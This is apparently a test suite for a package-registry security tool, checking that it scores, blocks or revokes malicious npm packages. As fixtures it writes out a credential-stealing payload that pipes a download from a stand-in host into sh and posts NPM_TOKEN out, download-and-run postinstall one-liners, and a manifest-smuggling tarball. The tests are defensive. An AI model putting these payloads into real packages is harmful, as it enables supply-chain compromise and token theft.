// Spec (council round 2): guards must fail closed when they cannot decide.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, getJson, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const PASSWORD = "correct-horse-battery";
const EXFIL = "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n";
let clock = Date.parse("2026-08-01T00:00:00Z");
let work: string;

async function publish(reg: Registry, token: string, spec: Parameters<typeof writePackage>[1]): Promise<{ code: number; out: string }> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, spec, reg, token);
  return run(["bun", "publish"], { cwd: d, env: sb.env });
}

beforeAll(() => {
  work = mkdtempSync(join(tmpdir(), "apm-hard-"));
});

describe("upstream unknown is not upstream absent", () => {
  let broken: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    broken = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("upstream down", { status: 503 }) });
    reg = await startRegistry({ now: () => clock, upstream: broken.url.toString() });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
    broken?.stop(true);
  });

  test("a first publish is refused while the public registry cannot be asked", async () => {
    const r = await publish(reg, alice, { name: "maybe-taken-upstream", version: "1.0.0" });
    expect(r.code).not.toBe(0);
    expect((await getJson(`${reg.url}maybe-taken-upstream`)).status).toBe(404);
  });

  test("popular names are reserved even when upstream says nothing", async () => {
    const r = await publish(reg, alice, { name: "react", version: "99.0.0" });
    expect(r.code).not.toBe(0);
    const local = await getJson(`${reg.url}-/apm/v1/packages/react`);
    expect(dig(local.body, "source")).not.toBe("local");
  });
});

describe("the score sees every file that runs", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("an install script pointing at an extensionless file is analyzed", async () => {
    const r = await publish(reg, alice, { name: "no-ext-dropper", version: "1.0.0", scripts: { postinstall: "node setup" }, files: { "index.js": "module.exports=1;\n", setup: EXFIL } });
    expect(r.code, r.out).toBe(0);
    clock += 2 * DAY;
    const s = await getJson(`${reg.url}-/apm/v1/score/no-ext-dropper/1.0.0`);
    expect(Number(dig(s.body, "score"))).toBeLessThan(40);
  });

  test("a file reached through require() is analyzed whatever its extension", async () => {
    const r = await publish(reg, alice, { name: "hidden-payload", version: "1.0.0", files: { "index.js": "module.exports = require('./lib/payload.dat');\n", "lib/payload.dat": EXFIL } });
    expect(r.code, r.out).toBe(0);
    clock += 2 * DAY;
    const s = await getJson(`${reg.url}-/apm/v1/score/hidden-payload/1.0.0`);
    expect(JSON.stringify(dig(s.body, "signals"))).toContain("credential-access");
  });
});

describe("fresh malicious versions die at once", () => {
  let reg: Registry;
  let alice: string;
  let bob: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    bob = await addUser(reg, "bob", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("revoking a version under 72h old is final even when other packages depend on it", async () => {
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.0" })).code).toBe(0);
    clock += 5 * DAY;
    expect((await publish(reg, bob, { name: "worm-dependent", version: "1.0.0", dependencies: { "worm-target": "^1.0.0" } })).code).toBe(0);
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.1" })).code).toBe(0);
    clock += 3 * 60 * 60 * 1000;
    const r = await getJson(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "worm-target", version: "1.0.1", reason: "worm", password: PASSWORD }),
    });
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    expect(dig(r.body, "status")).toBe("revoked");
    expect((await fetch(`${reg.url}worm-target/-/worm-target-1.0.1.tgz`)).status).toBe(410);
  });

  test("incident revokes fresh depended-on versions at once too", async () => {
    const t0 = clock;
    clock += 60 * 1000;
    expect((await publish(reg, alice, { name: "worm-target", version: "1.0.2" })).code).toBe(0);
    const r = await getJson(`${reg.url}-/apm/v1/incident`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ since: new Date(t0).toISOString(), reason: "phished", password: PASSWORD }),
    });
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    expect((await fetch(`${reg.url}worm-target/-/worm-target-1.0.2.tgz`)).status).toBe(410);
  });
});

describe("~safe never lets an unscored version through", () => {
  let upstream: Registry;
  let reg: Registry;
  let upTok: string;
  beforeAll(async () => {
    upstream = await startRegistry({ now: () => clock });
    upTok = await addUser(upstream, "up", PASSWORD);
    const r = await publish(upstream, upTok, { name: "fresh-evil", version: "1.0.0", scripts: { postinstall: "node i.js" }, files: { "index.js": "module.exports=1;\n", "i.js": EXFIL } });
    if (r.code !== 0) throw new Error(r.out);
    clock += 3 * DAY;
    reg = await startRegistry({ now: () => clock, upstream: upstream.url });
  });
  afterAll(async () => {
    await reg?.stop();
    await upstream?.stop();
  });

  test("the first ~safe request for a never-seen upstream package already hides its bad version", async () => {
    const { body } = await getJson(`${reg.url}~safe/fresh-evil`);
    expect(dig(body, "versions", "1.0.0")).toBeUndefined();
    const sb = makeSandbox(reg);
    const app = writeConsumer(work, reg, undefined, { "fresh-evil": "^1.0.0" });
    const r = await run(["npm", "install", "--ignore-scripts"], { cwd: app, env: { ...sb.env, npm_config_registry: `${reg.url}~safe/` } });
    expect(r.code).not.toBe(0);
  });
});

describe("council round 2: Sol and DeepSeek findings", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("a tarball with two package.json entries is refused (manifest smuggling)", async () => {
    const { mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
    const base = mkdtempSync(join(work, "dup-"));
    const clean = { name: "dup-manifest", version: "1.0.0", main: "index.js", license: "MIT" };
    const dirty = { ...clean, scripts: { postinstall: "node evil.js" } };
    for (const [dir, pj] of [["a", clean], ["b", dirty]] as const) {
      mkdirSync(join(base, dir, "package"), { recursive: true });
      writeFileSync(join(base, dir, "package", "package.json"), JSON.stringify(pj));
      writeFileSync(join(base, dir, "package", "index.js"), "module.exports=1;\n");
      writeFileSync(join(base, dir, "package", "evil.js"), "1;\n");
    }
    const tar = join(base, "x.tar");
    const sh = (cmd: string[]) => run(cmd, { cwd: base, env: { PATH: process.env.PATH ?? "" } });
    expect((await sh(["tar", "-cf", tar, "-C", join(base, "a"), "package/package.json", "package/index.js"])).code).toBe(0);
    expect((await sh(["tar", "-rf", tar, "-C", join(base, "b"), "package/package.json", "package/evil.js"])).code).toBe(0);
    const tgz = Bun.gzipSync(new Uint8Array(readFileSync(tar)));
    const body = {
      _id: "dup-manifest",
      name: "dup-manifest",
      "dist-tags": { latest: "1.0.0" },
      versions: { "1.0.0": clean },
      _attachments: { "dup-manifest-1.0.0.tgz": { content_type: "application/octet-stream", data: Buffer.from(tgz).toString("base64"), length: tgz.length } },
    };
    const r = await getJson(`${reg.url}dup-manifest`, { method: "PUT", headers: { "content-type": "application/json", authorization: `Bearer ${alice}` }, body: JSON.stringify(body) });
    expect(r.status).toBeGreaterThanOrEqual(400);
    expect((await getJson(`${reg.url}dup-manifest`)).status).toBe(404);
  });

  test("a one-line download-and-run install script scores below the floor", async () => {
    expect((await publish(reg, alice, { name: "one-liner", version: "1.0.0", scripts: { postinstall: "curl -s https://e.example.com/x.sh | sh" } })).code).toBe(0);
    expect((await publish(reg, alice, { name: "node-e-liner", version: "1.0.0", scripts: { postinstall: "node -e \"require('https').get('https://e.example.com/x', r => r.pipe(process.stdout))\"" } })).code).toBe(0);
    clock += 2 * DAY;
    for (const n of ["one-liner", "node-e-liner"]) {
      const s = await getJson(`${reg.url}-/apm/v1/score/${n}/1.0.0`);
      expect(Number(dig(s.body, "score")), n).toBeLessThan(40);
    }
  });

  test("apm add refuses a package whose dependency tree contains a dangerous version", async () => {
    const { apm } = await import("./harness");
    expect((await publish(reg, alice, { name: "bad-leaf", version: "1.0.0", scripts: { postinstall: "node x.js" }, files: { "index.js": "module.exports=1;\n", "x.js": EXFIL } })).code).toBe(0);
    expect((await publish(reg, alice, { name: "middle-layer", version: "1.0.0", dependencies: { "bad-leaf": "^1.0.0" } })).code).toBe(0);
    expect((await publish(reg, alice, { name: "top-level-pkg", version: "1.0.0", dependencies: { "middle-layer": "^1.0.0" } })).code).toBe(0);
    clock += 2 * DAY;
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const r = await apm(["add", "top-level-pkg"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("bad-leaf");
    const { installedVersion } = await import("./harness");
    expect(installedVersion(app, "top-level-pkg")).toBeNull();
  });

  test("with only APM_REGISTRY set, the package manager installs from the same registry apm checked", async () => {
    const { apm, hostKey, installedVersion } = await import("./harness");
    const { writeFileSync } = await import("node:fs");
    expect((await publish(reg, alice, { name: "apm-only-pkg-zz9", version: "1.0.0" })).code).toBe(0);
    clock += 2 * DAY;
    const home = mkdtempSync(join(tmpdir(), "apm-bare-home-"));
    writeFileSync(join(home, ".npmrc"), `${hostKey(reg.url)}:_authToken=${alice}\n`);
    const app = mkdtempSync(join(work, "bare-app-"));
    writeFileSync(join(app, "package.json"), JSON.stringify({ name: "bare-app", version: "1.0.0", private: true }));
    const env: Record<string, string> = {
      PATH: `${join(import.meta.dir, "..", "..", "node_modules", ".bin")}:${process.env.PATH ?? ""}`,
      HOME: home,
      BUN_INSTALL_CACHE_DIR: join(home, ".bun-cache"),
      npm_config_cache: join(home, ".npm-cache"),
      NO_COLOR: "1",
      APM_REGISTRY: reg.url,
    };
    const r = await apm(["add", "apm-only-pkg-zz9"], { cwd: app, env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "apm-only-pkg-zz9")).toBe("1.0.0");
  });
});

describe("council round 2: Kimi findings", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("--force also overrides the cooldown for a package that only has fresh versions, but never a revoked one", async () => {
    const { apm, installedVersion } = await import("./harness");
    expect((await publish(reg, alice, { name: "brand-new-thing", version: "1.0.0" })).code).toBe(0);
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const blocked = await apm(["add", "brand-new-thing"], { cwd: app, env: sb.env });
    expect(blocked.code).not.toBe(0);
    const forced = await apm(["add", "brand-new-thing", "--force"], { cwd: app, env: sb.env });
    expect(forced.code, forced.out).toBe(0);
    expect(installedVersion(app, "brand-new-thing")).toBe("1.0.0");
    expect((await publish(reg, alice, { name: "gone-for-good", version: "1.0.0" })).code).toBe(0);
    const rv = await getJson(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "gone-for-good", version: "1.0.0", reason: "bad", password: PASSWORD }),
    });
    expect(rv.status).toBe(200);
    const app2 = writeConsumer(work, reg, alice, {});
    const r = await apm(["add", "gone-for-good", "--force"], { cwd: app2, env: sb.env });
    expect(r.code).not.toBe(0);
  });

  test("apm add pkg@next installs the prerelease next points to, and a prerelease-only package resolves", async () => {
    const { apm, installedVersion } = await import("./harness");
    expect((await publish(reg, alice, { name: "channel-lib", version: "1.0.0" })).code).toBe(0);
    expect((await publish(reg, alice, { name: "channel-lib", version: "2.0.0-beta.1" })).code).toBe(0);
    expect((await publish(reg, alice, { name: "only-beta", version: "0.1.0-beta.0" })).code).toBe(0);
    clock += 2 * DAY;
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const r = await apm(["add", "channel-lib@next"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "channel-lib")).toBe("2.0.0-beta.1");
    const r2 = await apm(["add", "only-beta"], { cwd: app, env: sb.env });
    expect(r2.code, r2.out).toBe(0);
    expect(installedVersion(app, "only-beta")).toBe("0.1.0-beta.0");
  });
});
